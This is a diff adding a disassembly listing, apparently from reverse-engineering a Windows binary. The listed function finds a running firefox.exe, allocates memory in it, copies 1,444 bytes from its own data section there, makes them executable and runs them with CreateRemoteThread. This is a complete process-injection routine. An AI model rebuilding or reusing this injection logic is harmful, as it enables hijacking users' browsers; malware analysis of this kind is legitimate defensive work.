@@ -1,0 +1,93 @@
+            ; CALL XREF from main @ 0x1400011aa(x)
+┌ 384: section..text ();
+│ afv: vars(12:sp[0x10..0x1a0])
+│           0x140001000      48895c2408     mov qword [var_8h], rbx    ; [00] -r-x section size 53248 named .text
+│           0x140001005      4889742410     mov qword [var_10h], rsi
+│           0x14000100a      48897c2418     mov qword [var_18h], rdi
+│           0x14000100f      4156           push r14
+│           0x140001011      4881ec9001..   sub rsp, 0x190
+│           0x140001018      488b059965..   mov rax, qword [0x1400175b8] ; [0x1400175b8:8]=0x2b992ddfa232
+│           0x14000101f      4833c4         xor rax, rsp
+│           0x140001022      4889842480..   mov qword [var_180h], rax
+│           0x14000102a      33d2           xor edx, edx
+│           0x14000102c      c744245030..   mov dword [var_50h], 0x130 ; [0x130:4]=-1 ; 304
+│           0x140001034      8d4a02         lea ecx, [rdx + 2]
+│           0x140001037      e8040f0000     call sub.KERNEL32.dll_CreateToolhelp32Snapshot
+│           0x14000103c      488bf8         mov rdi, rax
+│           0x14000103f      4883f8ff       cmp rax, 0xffffffffffffffff
+│       ┌─< 0x140001043      0f840a010000   je 0x140001153
+│       │   0x140001049      488d542450     lea rdx, [var_50h]
+│       │   0x14000104e      488bc8         mov rcx, rax
+│       │   0x140001051      e8f00e0000     call sub.KERNEL32.dll_Process32First
+│       │   0x140001056      83f801         cmp eax, 1                 ; 1
+│      ┌──< 0x140001059      0f85f4000000   jne 0x140001153
+│      ││   0x14000105f      41bea4050000   mov r14d, 0x5a4            ; 1444
+│      ││   ; CODE XREF from section..text @ 0x140001140(x)
+│     ┌───> 0x140001065      488d15c4d2..   lea rdx, str.firefox.exe   ; 0x14000e330 ; "firefox.exe" ; uint32_t arg2
+│     ╎││   0x14000106c      488d4c247c     lea rcx, [var_7ch]         ; int64_t arg1
+│     ╎││   0x140001071      e88a200000     call fcn.140003100
+│     ╎││   0x140001076      85c0           test eax, eax
+│    ┌────< 0x140001078      0f85b2000000   jne 0x140001130
+│    │╎││   0x14000107e      448b442458     mov r8d, dword [dwProcessId] ; DWORD dwProcessId
+│    │╎││   0x140001083      33d2           xor edx, edx               ; BOOL bInheritHandle
+│    │╎││   0x140001085      b9ffff1f00     mov ecx, 0x1fffff          ; DWORD dwDesiredAccess
+│    │╎││   0x14000108a      ff1590cf0000   call qword [sym.imp.KERNEL32.dll_OpenProcess] ; [0x14000e020:8]=0x169e8 reloc.KERNEL32.dll_OpenProcess ; HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
+│    │╎││   0x140001090      488bf0         mov rsi, rax
+│    │╎││   0x140001093      4885c0         test rax, rax
+│   ┌─────< 0x140001096      0f8494000000   je 0x140001130
+│   ││╎││   0x14000109c      41b900300000   mov r9d, 0x3000            ; DWORD flAllocationType
+│   ││╎││   0x1400010a2      c744242004..   mov dword [lpNumberOfBytesWritten], 4 ; DWORD flProtect
+│   ││╎││   0x1400010aa      4d8bc6         mov r8, r14                ; SIZE_T dwSize
+│   ││╎││   0x1400010ad      33d2           xor edx, edx               ; LPVOID lpAddress
+│   ││╎││   0x1400010af      488bc8         mov rcx, rax               ; HANDLE hProcess
+│   ││╎││   0x1400010b2      ff1570cf0000   call qword [sym.imp.KERNEL32.dll_VirtualAllocEx] ; [0x14000e028:8]=0x169f6 reloc.KERNEL32.dll_VirtualAllocEx ; LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
+│   ││╎││   0x1400010b8      488364242000   and qword [lpNumberOfBytesWritten], 0 ; SIZE_T *lpNumberOfBytesWritten
+│   ││╎││   0x1400010be      4c8d053b5f..   lea r8, section..data      ; 0x140017000 ; LPCVOID lpBuffer
+│   ││╎││   0x1400010c5      488bd0         mov rdx, rax               ; LPVOID lpBaseAddress
+│   ││╎││   0x1400010c8      4d8bce         mov r9, r14                ; SIZE_T nSize
+│   ││╎││   0x1400010cb      488bce         mov rcx, rsi               ; HANDLE hProcess
+│   ││╎││   0x1400010ce      488bd8         mov rbx, rax
+│   ││╎││   0x1400010d1      ff1561cf0000   call qword [sym.imp.KERNEL32.dll_WriteProcessMemory] ; [0x14000e038:8]=0x16a1c reloc.KERNEL32.dll_WriteProcessMemory ; BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
+│   ││╎││   0x1400010d7      488d442440     lea rax, [var_40h]
+│   ││╎││   0x1400010dc      41b920000000   mov r9d, 0x20              ; 32 ; DWORD flNewProtect
+│   ││╎││   0x1400010e2      4d8bc6         mov r8, r14                ; SIZE_T dwSize
+│   ││╎││   0x1400010e5      4889442420     mov qword [lpNumberOfBytesWritten], rax ; PDWORD lpflOldProtect
+│   ││╎││   0x1400010ea      488bd3         mov rdx, rbx               ; LPVOID lpAddress
+│   ││╎││   0x1400010ed      488bce         mov rcx, rsi               ; HANDLE hProcess
+│   ││╎││   0x1400010f0      ff153acf0000   call qword [sym.imp.KERNEL32.dll_VirtualProtectEx] ; [0x14000e030:8]=0x16a08 reloc.KERNEL32.dll_VirtualProtectEx ; BOOL VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
+│   ││╎││   0x1400010f6      488364243000   and qword [lpThreadId], 0  ; LPDWORD lpThreadId
+│   ││╎││   0x1400010fc      4c8bcb         mov r9, rbx                ; LPTHREAD_START_ROUTINE lpStartAddress
+│   ││╎││   0x1400010ff      8364242800     and dword [dwCreationFlags], 0 ; DWORD dwCreationFlags
+│   ││╎││   0x140001104      33d2           xor edx, edx               ; LPSECURITY_ATTRIBUTES lpThreadAttributes
+│   ││╎││   0x140001106      488364242000   and qword [lpNumberOfBytesWritten], 0 ; LPVOID lpParameter
+│   ││╎││   0x14000110c      41b800100000   mov r8d, 0x1000            ; SIZE_T dwStackSize
+│   ││╎││   0x140001112      488bce         mov rcx, rsi               ; HANDLE hProcess
+│   ││╎││   0x140001115      ff15fdce0000   call qword [sym.imp.KERNEL32.dll_CreateRemoteThread] ; [0x14000e018:8]=0x169d2 reloc.KERNEL32.dll_CreateRemoteThread ; HANDLE CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
+│   ││╎││   0x14000111b      488bc8         mov rcx, rax               ; HANDLE hHandle
+│   ││╎││   0x14000111e      83caff         or edx, 0xffffffff         ; -1
+│   ││╎││   0x140001121      ff15e9ce0000   call qword [sym.imp.KERNEL32.dll_WaitForSingleObject] ; [0x14000e010:8]=0x169bc reloc.KERNEL32.dll_WaitForSingleObject ; DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
+│   ││╎││   0x140001127      488bce         mov rcx, rsi               ; HANDLE hObject
+│   ││╎││   0x14000112a      ff15d8ce0000   call qword [sym.imp.KERNEL32.dll_CloseHandle] ; [0x14000e008:8]=0x169ae reloc.KERNEL32.dll_CloseHandle ; BOOL CloseHandle(HANDLE hObject)
+│   ││╎││   ; CODE XREFS from section..text @ 0x140001078(x), 0x140001096(x)
+│   └└────> 0x140001130      488d542450     lea rdx, [var_50h]
+│     ╎││   0x140001135      488bcf         mov rcx, rdi
+│     ╎││   0x140001138      e80f0e0000     call sub.KERNEL32.dll_Process32Next
+│     ╎││   0x14000113d      83f801         cmp eax, 1                 ; 1
+│     └───< 0x140001140      0f841fffffff   je 0x140001065
+│      ││   0x140001146      488bcf         mov rcx, rdi               ; HANDLE hObject
+│      ││   0x140001149      ff15b9ce0000   call qword [sym.imp.KERNEL32.dll_CloseHandle] ; [0x14000e008:8]=0x169ae reloc.KERNEL32.dll_CloseHandle ; BOOL CloseHandle(HANDLE hObject)
+│      ││   0x14000114f      33c0           xor eax, eax
+│     ┌───< 0x140001151      eb03           jmp 0x140001156
+│     │││   ; CODE XREFS from section..text @ 0x140001043(x), 0x140001059(x)
+│     │└└─> 0x140001153      83c8ff         or eax, 0xffffffff         ; -1
+│     │     ; CODE XREF from section..text @ 0x140001151(x)
+│     └───> 0x140001156      488b8c2480..   mov rcx, qword [var_180h_2]
+│           0x14000115e      4833cc         xor rcx, rsp               ; uint32_t arg1
+│           0x140001161      e8ea000000     call fcn.140001250
+│           0x140001166      4c8d9c2490..   lea r11, [var_8h]
+│           0x14000116e      498b5b10       mov rbx, qword [r11 + 0x10]
+│           0x140001172      498b7318       mov rsi, qword [r11 + 0x18]
+│           0x140001176      498b7b20       mov rdi, qword [r11 + 0x20]
+│           0x14000117a      498be3         mov rsp, r11
+│           0x14000117d      415e           pop r14
+└           0x14000117f      c3             ret
